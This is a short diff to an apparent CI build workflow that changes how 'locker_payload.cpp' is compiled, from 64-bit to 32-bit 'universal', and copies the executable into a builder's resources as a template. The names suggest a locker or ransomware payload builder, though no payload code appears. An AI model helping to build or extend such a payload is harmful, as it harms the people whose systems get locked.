@@ -45,16 +45,16 @@ jobs:
       with:
         dotnet-version: 6.0.x
 
-    - name: Compile Template (64-bit)
+    - name: Compile Template (32-bit, Universal)
       shell: cmd
       run: |
         set PATH=C:\ProgramData\mingw64\mingw64\bin;%PATH%
         cd template
-        g++ -static -O2 -mwindows locker_payload.cpp -o locker_payload.exe -luser32 -lkernel32 -ladvapi32 -lshlwapi -lntdll
+        g++ -m32 -static -O2 -mwindows locker_payload.cpp -o locker_payload.exe -luser32 -lkernel32 -ladvapi32 -lshlwapi -lntdll
         if exist locker_payload.exe (
           mkdir ..\builder\Resources 2>nul
           copy locker_payload.exe ..\builder\Resources\template.exe
-          echo [SUCCESS] Template compiled (64-bit)
+          echo [SUCCESS] Template compiled (32-bit, universal)
         ) else (
           echo [ERROR] Compilation failed!
           exit /b 1
